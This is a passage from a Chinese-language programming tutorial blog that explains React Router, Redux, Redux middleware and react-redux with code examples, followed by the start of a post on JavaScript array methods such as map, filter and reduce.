component=&#123;Home&#125;/&gt; &lt;Route path=\"accounts\" component=&#123;Accounts&#125;/&gt; &lt;Route path=\"statements\" component=&#123;Statements&#125;/&gt; &lt;/Route&gt;&lt;/Router&gt; 现在，用户访问/的时候，加载的组件结构如下 123&lt;App&gt; &lt;Home/&gt;&lt;/App&gt; 注意，IndexRoute组件没有路径参数path 8.6、Redirect 组件 &lt;Redirect&gt;组件用于路由的跳转，即用户访问一个路由，会自动跳转到另一个路由 1234&lt;Route path=\"inbox\" component=&#123;Inbox&#125;&gt; &#123;/* 从 /inbox/messages/:id 跳转到 /messages/:id */&#125; ＜Redirect from=\"messages/:id\" to=\"/messages/:id\" /&gt;&lt;/Route&gt; 现在访问/inbox/messages/5，会自动跳转到/messages/5 8.7、IndexRedirect 组件 IndexRedirect组件用于访问根路由的时候，将用户重定向到某个子组件 12345&lt;Route path=\"/\" component=&#123;App&#125;&gt; ＜IndexRedirect to=\"/welcome\" /&gt; &lt;Route path=\"welcome\" component=&#123;Welcome&#125; /&gt; &lt;Route path=\"about\" component=&#123;About&#125; /&gt;&lt;/Route&gt; 用户访问根路径时，将自动重定向到子组件welcome 8.8、Link Link组件用于取代&lt;a&gt;元素，生成一个链接，允许用户点击后跳转到另一个路由。它基本上就是&lt;a&gt;元素的React 版本，可以接收Router的状态 12345678render() &#123; return &lt;div&gt; &lt;ul role=\"nav\"&gt; &lt;li&gt;&lt;Link to=\"/about\"&gt;About&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/repos\"&gt;Repos&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&#125; 如果希望当前的路由与其他路由有不同样式，这时可以使用Link组件的activeStyle属性 12&lt;Link to=\"/about\" activeStyle=&#123;&#123;color: 'red'&#125;&#125;&gt;About&lt;/Link&gt;&lt;Link to=\"/repos\" activeStyle=&#123;&#123;color: 'red'&#125;&#125;&gt;Repos&lt;/Link&gt; 在Router组件之外，导航到路由页面，可以使用浏览器的History API，像下面这样写 12import &#123; browserHistory &#125; from 'react-router';browserHistory.push('/some/path'); 8.9、IndexLink 如果链接到根路由/，不要使用Link组件，而要使用IndexLink组件 是因为对于根路由来说，activeStyle和activeClassName会失效，或者说总是生效，因为/会匹配任何子路由。而IndexLink组件会使用路径的精确匹配 123&lt;IndexLink to=\"/\" activeClassName=\"active\"&gt; Home&lt;/IndexLink&gt; 上面代码中，根路由只会在精确匹配时，才具有activeClassName 8.10、histroy 属性 Router组件的history属性，用来监听浏览器地址栏的变化，并将URL解析成一个地址对象，供 React Router 匹配 history属性，一共可以设置三种值。 browserHistory hashHistory createMemoryHistory 如果设为hashHistory，路由将通过URL的hash部分（#）切换，URL的形式类似example.com/#/some/path 123456import &#123; hashHistory &#125; from 'react-router'render( &lt;Router history=&#123;hashHistory&#125; routes=&#123;routes&#125; /&gt;, document.getElementById('app')) 如果设为browserHistory，浏览器的路由就不再通过Hash完成了，而显示正常的路径example.com/some/path，背后调用的是浏览器的History API 123456import &#123; browserHistory &#125; from 'react-router'render( &lt;Router history=&#123;browserHistory&#125; routes=&#123;routes&#125; /&gt;, document.getElementById('app')) 但是，这种情况需要对服务器改造。否则用户直接向服务器请求某个子路由，会显示网页找不到的404错误。 8.11、表单处理 Link组件用于正常的用户点击跳转，但是有时还需要表单跳转、点击按钮跳转等操作 12345&lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;input type=\"text\" placeholder=\"userName\"/&gt; &lt;input type=\"text\" placeholder=\"repo\"/&gt; &lt;button type=\"submit\"&gt;Go&lt;/button&gt;&lt;/form&gt; 第一种方法是使用browserHistory.push 12345678910import &#123; browserHistory &#125; from 'react-router'// ... handleSubmit(event) &#123; event.preventDefault() const userName = event.target.elements[0].value const repo = event.target.elements[1].value const path = `/repos/$&#123;userName&#125;/$&#123;repo&#125;` browserHistory.push(path) &#125;, 第二种方法是使用context对象 123456789101112export default React.createClass(&#123; // ask for `router` from context contextTypes: &#123; router: React.PropTypes.object &#125;, handleSubmit(event) &#123; // ... this.context.router.push(path) &#125;,&#125;) 8.12、路由的钩子 每个路由都有Enter和Leave钩子，用户进入或离开该路由时触发 上面的代码中，如果用户离开/messages/:id，进入/about时，会依次触发以下的钩子 /messages/:id的onLeave /inbox的onLeave /about的onEnter 九、redux9.1 Redux 的适用场景 某个组件的状态，需要共享 某个状态需要在任何地方都可以拿到 一个组件需要改变全局状态 一个组件需要改变另一个组件的状态 Redux设计思想 Redux 的设计思想很简单，就两句话 Web 应用是一个状态机，视图与状态是一一对应的 所有的状态，保存在一个对象里面 9.2 基本概念和 APIStore Store 提供了三个方法 store.getState() store.dispatch() store.subscribe() 12import &#123; createStore &#125; from 'redux';let &#123; subscribe, dispatch, getState &#125; = createStore(reducer); Store就是保存数据的地方，你可以把它看成一个容器。整个应用只能有一个 Store Redux 提供createStore这个函数，用来生成 Store 12import &#123; createStore &#125; from 'redux';const store = createStore(reducer); // 返回新生成的 Store 对象 State Store对象包含所有数据。如果想得到某个时点的数据，就要对 Store 生成快照。这种时点的数据集合，就叫做 State 当前时刻的 State，可以通过store.getState()拿到 1234import &#123; createStore &#125; from 'redux';const store = createStore(reducer);const state = store.getState(); Redux 规定， 一个 State 对应一个 View。只要 State 相同，View 就相同。你知道 State，就知道 View 是什么样，反之亦然 Action State 的变化，会导致 View 的变化。但是，用户接触不到 State，只能接触到 View。所以，State 的变化必须是 View 导致的。Action 就是 View 发出的通知，表示 State 应该要发生变化了 Action 是一个对象。其中的type属性是必须的，表示 Action 的名称。其他属性可以自由设置 1234const action = &#123; type: 'ADD_TODO', payload: 'Learn Redux'&#125; 上面代码中，Action 的名称是ADD_TODO，它携带的信息是字符串Learn Redux 可以这样理解，Action 描述当前发生的事情。改变 State 的唯一办法，就是使用 Action。它会运送数据到 Store action有两个作用，一个是定义我们的应用可以进行的动作或操作的类型，另一个是传递改变应用状态的数据。在Redux的约定中，action只有type属性是必须包含的，其他的数据如何定义全在于你想要如何使用，当然如果你希望你定义的action能够规范一些的话，也可以遵从Flux Standard Action的标准 1234567891011121314&#123; // action 类型 type: 'INCREMENT', // payload 中返回我们要传递的数据，用来修改应用 state payload: &#123; num: 1 &#125;, // payload 数据未获取成功时返回 true error: false, // 一些不必要在 payload 中传递的其他数据 meta: &#123; success: true &#125;&#125; Action Creator View 要发送多少种消息，就会有多少种 Action。如果都手写，会很麻烦。可以定义一个函数来生成 Action，这个函数就叫 Action Creator 12345678910const ADD_TODO = '添加 TODO';function addTodo(text) &#123; return &#123; type: ADD_TODO, text &#125;&#125;const action = addTodo('Learn Redux'); 上面代码中，addTodo函数就是一个 Action Creator store.dispatch() store.dispatch()是 View 发出 Action 的唯一方法 1234567import &#123; createStore &#125; from 'redux';const store = createStore(fn);store.dispatch(&#123; type: 'ADD_TODO', payload: 'Learn Redux'&#125;); 上面代码中，store.dispatch接受一个 Action 对象作为参数，将它发送出去 结合 Action Creator，这段代码可以改写如下 1store.dispatch(addTodo('Learn Redux')); Reducer Store 收到 Action 以后，必须给出一个新的 State，这样 View 才会发生变化。这种 State 的计算过程就叫做 Reducer 1234const reducer = function (state, action) &#123; // ... return new_state;&#125;; 整个应用的初始状态，可以作为 State 的默认值。下面是一个实际的例子 1234567891011121314const defaultState = 0;const reducer = (state = defaultState, action) =&gt; &#123; switch (action.type) &#123; case 'ADD': return state + action.payload; default: return state; &#125;&#125;;const state = reducer(1, &#123; type: 'ADD', payload: 2&#125;); 上面代码中，reducer函数收到名为ADD的 Action 以后，就返回一个新的 State，作为加法的计算结果。其他运算的逻辑（比如减法），也可以根据 Action 的不同来实现 实际应用中，Reducer 函数不用像上面这样手动调用，store.dispatch方法会触发 Reducer 的自动执行 为此，Store 需要知道 Reducer 函数，做法就是在生成 Store 的时候，将 Reducer 传入createStore方法 12import &#123; createStore &#125; from &apos;redux&apos;;const store = createStore(reducer); 上面代码中，createStore接受 Reducer 作为参数，生成一个新的 Store。以后每当store.dispatch发送过来一个新的 Action，就会自动调用 Reducer，得到新的 State 为什么这个函数叫做 Reducer呢？因为它可以作为数组的reduce方法的参数 纯函数 Reducer 函数最重要的特征是，它是一个纯函数。也就是说，只要是同样的输入，必定得到同样的输出 纯函数是函数式编程的概念，必须遵守以下一些约束 不得改写参数 不能调用系统 I/O 的API 不能调用Date.now()或者Math.random()等不纯的方法，因为每次会得到不一样的结果 由于 Reducer 是纯函数，就可以保证同样的State，必定得到同样的 View。但也正因为这一点，Reducer 函数里面不能改变 State，必须返回一个全新的对象，请参考下面的写法 1234567891011// State 是一个对象function reducer(state, action) &#123; return Object.assign(&#123;&#125;, state, &#123; thingToChange &#125;); // 或者 return &#123; ...state, ...newState &#125;;&#125;// State 是一个数组function reducer(state, action) &#123; return [...state, newItem];&#125; 最好把 State 对象设成只读。你没法改变它，要得到新的 State，唯一办法就是生成一个新对象。这样的好处是，任何时候，与某个 View 对应的 State 总是一个不变的对象 store.subscribe() Store 允许使用store.subscribe方法设置监听函数，一旦 State 发生变化，就自动执行这个函数 1234import &#123; createStore &#125; from 'redux';const store = createStore(reducer);store.subscribe(listener); 显然，只要把 View 的更新函数（对于 React 项目，就是组件的render方法或setState方法）放入listen，就会实现 View 的自动渲染 store.subscribe方法返回一个函数，调用这个函数就可以解除监听 12345let unsubscribe = store.subscribe(() =&gt; console.log(store.getState()));unsubscribe(); 9.3 Reducer 的拆分 Reducer 函数负责生成 State。由于整个应用只有一个 State 对象，包含所有数据，对于大型应用来说，这个 State 必然十分庞大，导致 Reducer 函数也十分庞大 123456789101112131415161718const chatReducer = (state = defaultState, action = &#123;&#125;) =&gt; &#123; const &#123; type, payload &#125; = action; switch (type) &#123; case ADD_CHAT: return Object.assign(&#123;&#125;, state, &#123; chatLog: state.chatLog.concat(payload) &#125;); case CHANGE_STATUS: return Object.assign(&#123;&#125;, state, &#123; statusMessage: payload &#125;); case CHANGE_USERNAME: return Object.assign(&#123;&#125;, state, &#123; userName: payload &#125;); default: return state; &#125;&#125;; 1234567const chatReducer = (state = defaultState, action = &#123;&#125;) =&gt; &#123; return &#123; chatLog: chatLog(state.chatLog, action), statusMessage: statusMessage(state.statusMessage, action), userName: userName(state.userName, action) &#125;&#125;; 上面代码中，Reducer 函数被拆成了三个小函数，每一个负责生成对应的属 这样一拆，Reducer 就易读易写多了。而且，这种拆分与 React 应用的结构相吻合:一个 React 根组件由很多子组件构成。这就是说，子组件与子 Reducer 完全可以对应 Redux 提供了一个combineReducers方法，用于 Reducer 的拆分。你只要定义各个子 Reducer 函数，然后用这个方法，将它们合成一个大的 Reducer 123456789import &#123; combineReducers &#125; from 'redux';const chatReducer = combineReducers(&#123; chatLog, statusMessage, userName&#125;)export default todoApp; 这种写法有一个前提，就是 State 的属性名必须与子 Reducer 同名。如果不同名，就要采用下面的写法 1234567function reducer(state = &#123;&#125;, action) &#123; return &#123; a: doSomethingWithA(state.a, action), b: processB(state.b, action), c: c(state.c, action) &#125;&#125; 总之，combineReducers()做的就是产生一个整体的 Reducer 函数。该函数根据 State 的 key 去执行相应的子 Reducer，并将返回结果合并成一个大的 State 对象 你可以把所有子 Reducer 放在一个文件里面，然后统一引入 1234import &#123; combineReducers &#125; from 'redux'import * as reducers from './reducers'const reducer = combineReducers(reducers) 9.4 工作流程 image image.png react组件+redux单向数据流 前端异步请求用例 PFAT如何解决前端异步请求的用例？ 首先，用户发出 Action 1store.dispatch(action); 然后，Store 自动调用 Reducer，并且传入两个参数：当前 State 和收到的 Action。 Reducer 会返回新的 State 1let nextState = todoApp(previousState, action); State 一旦有变化，Store 就会调用监听函数 12// 设置监听函数store.subscribe(listener); listener可以通过store.getState()得到当前状态。如果使用的是 React，这时可以触发重新渲染 View 1234function listerner() &#123; let newState = store.getState(); component.setState(newState); &#125; 9.5 实例：计数器12345678910111213141516171819202122232425262728293031const Counter = (&#123; value, onIncrement, onDecrement &#125;) =&gt; ( &lt;div&gt; &lt;h1&gt;&#123;value&#125;&lt;/h1&gt; &lt;button onClick=&#123;onIncrement&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;onDecrement&#125;&gt;-&lt;/button&gt; &lt;/div&gt;);const reducer = (state = 0, action) =&gt; &#123; switch (action.type) &#123; case 'INCREMENT': return state + 1; case 'DECREMENT': return state - 1; default: return state; &#125;&#125;;const store = createStore(reducer);const render = () =&gt; &#123; ReactDOM.render( &lt;Counter value=&#123;store.getState()&#125; onIncrement=&#123;() =&gt; store.dispatch(&#123;type: 'INCREMENT'&#125;)&#125; onDecrement=&#123;() =&gt; store.dispatch(&#123;type: 'DECREMENT'&#125;)&#125; /&gt;, document.getElementById('root') );&#125;;render();store.subscribe(render); 十、中间件与异步操作 Redux 的基本做法：用户发出 Action，Reducer 函数算出新的 State，View 重新渲染 一个关键问题没有解决：异步操作怎么办？Action 发出以后，Reducer 立即算出 State，这叫做同步；Action 发出以后，过一段时间再执行 Reducer，这就是异步 怎么才能 Reducer 在异步操作结束后自动执行呢？这就要用到新的工具：中间件（middleware） image 10.1 中间件的概念 中间件就是一个函数，对store.dispatch方法进行了改造，在发出 Action 和执行 Reducer 这两步之间，添加了其他功能。 10.2 中间件的用法 常用的中间件都有现成的，只要引用别人写好的模块即可。比如日志中间件，就有现成的redux-logger模块 12345678import &#123; applyMiddleware, createStore &#125; from 'redux';import createLogger from 'redux-logger';const logger = createLogger();const store = createStore( reducer, applyMiddleware(logger)); 上面代码中，redux-logger提供一个生成器createLogger，可以生成日志中间件logger。然后，将它放在applyMiddleware方法之中，传入createStore方法，就完成了store.dispatch()的功能增强 这里有两点需要注意 （1）createStore方法可以接受整个应用的初始状态作为参数，那样的话，applyMiddleware就是第三个参数了 12345const store = createStore( reducer, initial_state, applyMiddleware(logger)); （2）中间件的次序有讲究 1234const store = createStore( reducer, applyMiddleware(thunk, promise, logger)); 上面代码中，applyMiddleware方法的三个参数，就是三个中间件。有的中间件有次序要求，使用前要查一下文档。比如，logger就一定要放在最后，否则输出结果会不正确 10.3、applyMiddlewares() applyMiddlewares这个方法。它是 Redux 的原生方法，作用是将所有中间件组成一个数组，依次执行 10.4 异步操作的基本思路 理解了中间件以后，就可以处理异步操作了 同步操作只要发出一种 Action 即可，异步操作的差别是它要发出三种 Action 操作发起时的 Action 操作成功时的 Action 操作失败时的 Action 以向服务器取出数据为例，三种 Action 可以有两种不同的写法 123456789// 写法一：名称相同，参数不同&#123; type: 'FETCH_POSTS' &#125;&#123; type: 'FETCH_POSTS', status: 'error', error: 'Oops' &#125;&#123; type: 'FETCH_POSTS', status: 'success', response: &#123; ... &#125; &#125;// 写法二：名称不同&#123; type: 'FETCH_POSTS_REQUEST' &#125;&#123; type: 'FETCH_POSTS_FAILURE', error: 'Oops' &#125;&#123; type: 'FETCH_POSTS_SUCCESS', response: &#123; ... &#125; &#125; 除了 Action种类不同，异步操作的 State 也要进行改造，反映不同的操作状态。下面是 State 的一个例子 123456let state = &#123; // ... isFetching: true, didInvalidate: true, lastUpdated: 'xxxxxxx'&#125;; 上面代码中，State 的属性isFetching表示是否在抓取数据。didInvalidate表示数据是否过时，lastUpdated表示上一次更新时间 现在，整个异步操作的思路就很清楚了 操作开始时，送出一个 Action，触发 State 更新为”正在操作”状态，View 重新渲染 操作结束后，再送出一个 Action，触发 State 更新为”操作结束”状态，View 再一次重新渲染 10.5 redux-thunk 中间件 异步操作至少要送出两个 Action：用户触发第一个 Action，这个跟同步操作一样，没有问题；如何才能在操作结束时，系统自动送出第二个 Action 呢 奥妙就在 Action Creator 之中 1234567class AsyncApp extends Component &#123; componentDidMount() &#123; const &#123; dispatch, selectedPost &#125; = this.props dispatch(fetchPosts(selectedPost)) &#125;// ... 上面代码是一个异步组件的例子。加载成功后（componentDidMount方法），它送出了（dispatch方法）一个 Action，向服务器要求数据 fetchPosts(selectedSubreddit)。这里的fetchPosts就是 Action Creator 下面就是fetchPosts的代码，关键之处就在里面 image 1234567891011121314const fetchPosts = postTitle =&gt; (dispatch, getState) =&gt; &#123; dispatch(requestPosts(postTitle)); return fetch(`/some/API/$&#123;postTitle&#125;.json`) .then(response =&gt; response.json()) .then(json =&gt; dispatch(receivePosts(postTitle, json))); &#125;;&#125;;// 使用方法一store.dispatch(fetchPosts('reactjs'));// 使用方法二store.dispatch(fetchPosts('reactjs')).then(() =&gt; console.log(store.getState())); 上面代码中，fetchPosts是一个Action Creator（动作生成器），返回一个函数。这个函数执行后，先发出一个Action（requestPosts(postTitle)），然后进行异步操作。拿到结果后，先将结果转成 JSON 格式，然后再发出一个 Action（ receivePosts(postTitle, json)） 上面代码中，有几个地方需要注意 fetchPosts返回了一个函数，而普通的 Action Creator 默认返回一个对象 返回的函数的参数是dispatch和getState这两个 Redux方法，普通的Action Creator的参数是 Action 的内容 在返回的函数之中，先发出一个 Action（requestPosts(postTitle)），表示操作开始 异步操作结束之后，再发出一个 Action（receivePosts(postTitle, json)），表示操作结束 这样的处理，就解决了自动发送第二个 Action 的问题。但是，又带来了一个新的问题，Action 是由store.dispatch方法发送的。而store.dispatch方法正常情况下，参数只能是对象，不能是函数 这时，就要使用中间件redux-thunk 123456789import &#123; createStore, applyMiddleware &#125; from 'redux';import thunk from 'redux-thunk';import reducer from './reducers';// Note: this API requires redux@&gt;=3.1.0const store = createStore( reducer, applyMiddleware(thunk)); 上面代码使用redux-thunk中间件，改造store.dispatch，使得后者可以接受函数作为参数 因此，异步操作的第一种解决方案就是，写出一个返回函数的 Action Creator，然后使用redux-thunk中间件改造store.dispatch 10.6、redux-promise 中间件 既然 Action Creator 可以返回函数，当然也可以返回其他值。另一种异步操作的解决方案，就是让 Action Creator 返回一个 Promise 对象 这就需要使用redux-promise中间件 12345678import &#123; createStore, applyMiddleware &#125; from 'redux';import promiseMiddleware from 'redux-promise';import reducer from './reducers';const store = createStore( reducer, applyMiddleware(promiseMiddleware)); 这个中间件使得store.dispatch方法可以接受 Promise 对象作为参数。这时，Action Creator 有两种写法 写法一，返回值是一个 Promise 对象 123456789const fetchPosts = (dispatch, postTitle) =&gt; new Promise(function (resolve, reject) &#123; dispatch(requestPosts(postTitle)); return fetch(`/some/API/$&#123;postTitle&#125;.json`) .then(response =&gt; &#123; type: 'FETCH_POSTS', payload: response.json() &#125;);&#125;); 写法二，Action 对象的payload属性是一个 Promise 对象。这需要从redux-actions模块引入createAction方法，并且写法也要变成下面这样 1234567891011121314import &#123; createAction &#125; from 'redux-actions';class AsyncApp extends Component &#123; componentDidMount() &#123; const &#123; dispatch, selectedPost &#125; = this.props // 发出同步 Action dispatch(requestPosts(selectedPost)); // 发出异步 Action dispatch(createAction( 'FETCH_POSTS', fetch(`/some/API/$&#123;postTitle&#125;.json`) .then(response =&gt; response.json()) )); &#125; 上面代码中，第二个dispatch方法发出的是异步 Action，只有等到操作结束，这个 Action 才会实际发出 注意，createAction的第二个参数必须是一个 Promise 对象 十一、react-redux 为了方便使用，Redux 的作者封装了一个 React专用的库 React-Redux 这个库是可以选用的。实际项目中，你应该权衡一下，是直接使用 Redux，还是使用 React-Redux。后者虽然提供了便利，但是需要掌握额外的 API，并且要遵守它的组件拆分规范 11.1 UI 组件 React-Redux 将所有组件分成两大类：UI 组件（presentational component）和容器组件（container component） UI 组件有以下几个特征 只负责 UI 的呈现，不带有任何业务逻辑 没有状态（即不使用this.state这个变量） 所有数据都由参数（this.props）提供 不使用任何 Redux 的 API 123// 例子const Title = value =&gt; &lt;h1&gt;&#123;value&#125;&lt;/h1&gt;; 因为不含有状态，UI 组件又称为”纯组件”，即它纯函数一样，纯粹由参数决定它的值 11.2、容器组件 负责管理数据和业务逻辑，不负责 UI 的呈现 带有内部状态 使用 Redux 的 API UI 组件负责 UI 的呈现，容器组件负责管理数据和逻辑 如果一个组件既有 UI 又有业务逻辑，那怎么办？回答是，将它拆分成下面的结构：外面是一个容器组件，里面包了一个UI 组件。前者负责与外部的通信，将数据传给后者，由后者渲染出视图 React-Redux 规定，所有的 UI 组件都由用户提供，容器组件则是由 React-Redux 自动生成。也就是说，用户负责视觉层，状态管理则是全部交给它 11.3、connect() React-Redux 提供connect方法，用于从 UI 组件生成容器组件。connect的意思，就是将这两种组件连起来。 12import &#123; connect &#125; from 'react-redux'const VisibleTodoList = connect()(TodoList); 上面代码中，TodoList是 UI 组件，VisibleTodoList就是由 React-Redux 通过connect方法自动生成的容器组件 但是，因为没有定义业务逻辑，上面这个容器组件毫无意义，只是 UI 组件的一个单纯的包装层。为了定义业务逻辑，需要给出下面两方面的信息。 （1）输入逻辑：外部的数据（即state对象）如何转换为 UI 组件的参数 （2）输出逻辑：用户发出的动作如何变为 Action 对象，从 UI 组件传出去 因此，connect方法的完整 API 如下 123456import &#123; connect &#125; from 'react-redux'const VisibleTodoList = connect( mapStateToProps, mapDispatchToProps)(TodoList) 上面代码中，connect方法接受两个参数：mapStateToProps和mapDispatchToProps。它们定义了 UI 组件的业务逻辑。前者负责输入逻辑，即将state映射到 UI 组件的参数（props），后者负责输出逻辑，即将用户对 UI 组件的操作映射成 Action 11.4、mapStateToProps() mapStateToProps是一个函数。它的作用就是像它的名字那样，建立一个从（外部的）state对象到（UI 组件的）props对象的映射关系 作为函数，mapStateToProps执行后应该返回一个对象，里面的每一个键值对就是一个映射 12345const mapStateToProps = (state) =&gt; &#123; return &#123; todos: getVisibleTodos(state.todos, state.visibilityFilter) &#125;&#125; 上面代码中，mapStateToProps是一个函数，它接受state作为参数，返回一个对象 这个对象有一个todos属性，代表 UI 组件的同名参数，后面的getVisibleTodos也是一个函数，可以从state算出 todos 的值 下面就是getVisibleTodos的一个例子，用来算出todos 123456789101112const getVisibleTodos = (todos, filter) =&gt; &#123; switch (filter) &#123; case 'SHOW_ALL': return todos case 'SHOW_COMPLETED': return todos.filter(t =&gt; t.completed) case 'SHOW_ACTIVE': return todos.filter(t =&gt; !t.completed) default: throw new Error('Unknown filter: ' + filter) &#125;&#125; mapStateToProps会订阅 Store，每当state更新的时候，就会自动执行，重新计算 UI 组件的参数，从而触发 UI 组件的重新渲染 mapStateToProps的第一个参数总是state对象，还可以使用第二个参数，代表容器组件的props对象 12345678910// 容器组件的代码// &lt;FilterLink filter=\"SHOW_ALL\"&gt;// All// &lt;/FilterLink&gt;const mapStateToProps = (state, ownProps) =&gt; &#123; return &#123; active: ownProps.filter === state.visibilityFilter &#125;&#125; 使用ownProps作为参数后，如果容器组件的参数发生变化，也会引发 UI 组件重新渲染 connect方法可以省略mapStateToProps参数，那样的话，UI 组件就不会订阅Store，就是说 Store 的更新不会引起 UI 组件的更新 11.5、mapDispatchToProps() mapDispatchToProps是connect函数的第二个参数，用来建立 UI 组件的参数到store.dispatch方法的映射 也就是说，它定义了哪些用户的操作应该当作 Action，传给 Store。它可以是一个函数，也可以是一个对象 如果mapDispatchToProps是一个函数，会得到dispatch和ownProps（容器组件的props对象）两个参数 12345678910111213const mapDispatchToProps = ( dispatch, ownProps) =&gt; &#123; return &#123; onClick: () =&gt; &#123; dispatch(&#123; type: 'SET_VISIBILITY_FILTER', filter: ownProps.filter &#125;); &#125; &#125;;&#125; 从上面代码可以看到，mapDispatchToProps作为函数，应该返回一个对象，该对象的每个键值对都是一个映射，定义了 UI 组件的参数怎样发出 Action 如果mapDispatchToProps是一个对象，它的每个键名也是对应 UI 组件的同名参数，键值应该是一个函数，会被当作 Action creator ，返回的 Action 会由 Redux 自动发出。举例来说，上面的mapDispatchToProps写成对象就是下面这样 123456const mapDispatchToProps = &#123; onClick: (filter) =&gt; &#123; type: 'SET_VISIBILITY_FILTER', filter: filter &#125;;&#125; 11.6、 组件 connect方法生成容器组件以后，需要让容器组件拿到state对象，才能生成 UI 组件的参数 一种解决方法是将state对象作为参数，传入容器组件。但是，这样做比较麻烦，尤其是容器组件可能在很深的层级，一级级将state传下去就很麻烦。 React-Redux 提供Provider组件，可以让容器组件拿到state 12345678910111213import &#123; Provider &#125; from 'react-redux'import &#123; createStore &#125; from 'redux'import todoApp from './reducers'import App from './components/App'let store = createStore(todoApp);render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById('root')) 上面代码中，Provider在根组件外面包了一层，这样一来，App的所有子组件就默认都可以拿到state 它的原理是React组件的context属性 11.7、实例：计数器 我们来看一个实例。下面是一个计数器组件，它是一个纯的 UI 组件 1234567891011class Counter extends Component &#123; render() &#123; const &#123; value, onIncreaseClick &#125; = this.props return ( &lt;div&gt; &lt;span&gt;&#123;value&#125;&lt;/span&gt; &lt;button onClick=&#123;onIncreaseClick&#125;&gt;Increase&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; 这个 UI 组件有两个参数：value和onIncreaseClick。前者需要从state计算得到，后者需要向外发出 Action 接着，定义value到state的映射，以及onIncreaseClick到dispatch的映射 1234567891011121314function mapStateToProps(state) &#123; return &#123; value: state.count &#125;&#125;function mapDispatchToProps(dispatch) &#123; return &#123; onIncreaseClick: () =&gt; dispatch(increaseAction) &#125;&#125;// Action Creatorconst increaseAction = &#123; type: 'increase' &#125; 然后，使用connect方法生成容器组件 1234const App = connect( mapStateToProps, mapDispatchToProps)(Counter) 然后，定义这个组件的 Reducer 12345678910// Reducerfunction counter(state = &#123; count: 0 &#125;, action) &#123; const count = state.count switch (action.type) &#123; case 'increase': return &#123; count: count + 1 &#125; default: return state &#125;&#125; 最后，生成store对象，并使用Provider在根组件外面包一层 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import React, &#123; Component &#125; from 'react'import PropTypes from 'prop-types'import ReactDOM from 'react-dom'import &#123; createStore &#125; from 'redux'import &#123; Provider, connect &#125; from 'react-redux'// React componentclass Counter extends Component &#123; render() &#123; const &#123; value, onIncreaseClick &#125; = this.props return ( &lt;div&gt; &lt;span&gt;&#123;value&#125;&lt;/span&gt; &lt;button onClick=&#123;onIncreaseClick&#125;&gt;Increase&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;Counter.propTypes = &#123; value: PropTypes.number.isRequired, onIncreaseClick: PropTypes.func.isRequired&#125;// Actionconst increaseAction = &#123; type: 'increase' &#125;// Reducerfunction counter(state = &#123; count: 0 &#125;, action) &#123; const count = state.count switch (action.type) &#123; case 'increase': return &#123; count: count + 1 &#125; default: return state &#125;&#125;// Storeconst store = createStore(counter)// Map Redux state to component propsfunction mapStateToProps(state) &#123; return &#123; value: state.count &#125;&#125;// Map Redux actions to component propsfunction mapDispatchToProps(dispatch) &#123; return &#123; onIncreaseClick: () =&gt; dispatch(increaseAction) &#125;&#125;// Connected Componentconst App = connect( mapStateToProps, mapDispatchToProps)(Counter)ReactDOM.render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;, document.getElementById('root')) 十二、思维导图总结 image.png","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"JavaScript原生数组及高阶函数","slug":"2017-11-js-some-filter-reduce","date":"2017-11-07T10:55:24.000Z","updated":"2018-10-24T03:46:02.215Z","comments":true,"path":"note/ba91dc04.html","link":"","permalink":"https://ru23.com/note/ba91dc04.html","excerpt":"","text":"一、map map() 方法创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果 callback 函数会被自动传入三个参数：数组元素，元素索引，原数组本身 123456let list = [1, 2, 3, 4, 5];let other = list.map((d, i) =&gt; &#123; return d * 2;&#125;);console.log(other);// print: [2, 4, 6, 8, 10] 二、filter语法 1var new_array = arr.filter(callback[, thisArg]) filter() 方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素 参数 callback 返回true表示保留该元素（通过测试），false则不保留 用来测试数组的每个元素的函数。调用时使用参数 (element, index, array)。 返回true表示保留该元素（通过测试），false则不保留 1234567function isBigEnough(value) &#123; return value &gt;= 10;&#125;var filtered = [12, 5, 8, 130, 44].filter(isBigEnough);// filtered is [12, 130, 44] 三、some 返回一个boolean，判断是否有元素符合func条件，如果有一个元素符合func条件，则循环会终止 some()方法测试数组中的某些元素是否通过由提供的函数实现的测试 123456789const isBiggerThan10 = (element, index, array) =&gt; &#123; return element &gt; 10;&#125;[2, 5, 8, 1, 4].some(isBiggerThan10); // false[12, 5, 8, 1, 4].some(isBiggerThan10); // true 四、every 返回一个boolean，判断每个元素是否符合func条件，有一个元素不满足func条件，则循环终止，返回false every 方法为数组中的每个元素执行一次 callback 函数，直到它找到一个使 callback 返回 false（表示可转换为布尔值 false 的值）的元素。如果发现了一个这样的元素，every 方法将会立即返回 false。否则，callback 为每一个元素返回 true，every 就会返回 true 1234567function isBigEnough(element, index, array) &#123; return (element &gt;= 10);&#125;var passed = [12, 5, 8, 130, 44].every(isBigEnough);// passed is falsepassed = [12, 54, 18, 130, 44].every(isBigEnough);// passed is true 五、reduce和reduceRight .reduce从左到右而.reduceRight从右到左循环遍历数组，每次调用接收目前为止的部分结果和当前遍历的值 reduce() 方法对累加器和数组中的每个元素（从左到右）应用一个函数，将其减少为单个值 两种方法都有如下典型用法：.reduce(callback(previousValue, currentValue, index, array), initialValue)。 previousValue是最后被调用的回调函数的返回值，initialValue是开始时previousValue被初始化的值。currentValue 是当前被遍历的元素值，index是当前元素在数组中的索引值。array是对调用.reduce数组的简单引用 12345678Array.prototype.sum = function () &#123; return this.reduce(function (partial, value) &#123; return partial + value &#125;, 0)&#125;;[3,4,5,6,10].sum()// &lt;- 28 可以使用.reduce作为对象的字符串生成器 123456789101112131415function concat (input) &#123; return input.reduce(function (partial, value) &#123; if (partial) &#123; partial += ', ' &#125; return partial + value &#125;, '')&#125;concat([ &#123; name: 'George' &#125;, 